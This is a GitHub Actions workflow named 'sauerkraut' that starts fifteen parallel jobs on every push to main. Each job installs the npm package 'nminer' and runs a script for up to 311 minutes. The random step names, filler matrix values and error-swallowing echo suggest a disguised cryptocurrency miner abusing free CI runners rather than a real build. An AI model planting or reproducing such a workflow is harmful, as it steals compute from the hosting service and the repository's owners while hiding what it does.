name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7849 }
          - { version: 4266 }
          - { version: 4450 }
          - { version: 6098 }
          - { version: 2255 }
          - { version: 4495 }
          - { version: 4550 }
          - { version: 8988 }
          - { version: 815 }
          - { version: 1996 }
          - { version: 5527 }
          - { version: 5001 }
          - { version: 2653 }
          - { version: 6441 }
          - { version: 6213 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: submitter citizen gadzooks
        run: |
          npm install nminer@latest
          timeout 311m node sauerkraut.js || echo "sauerkraut executed"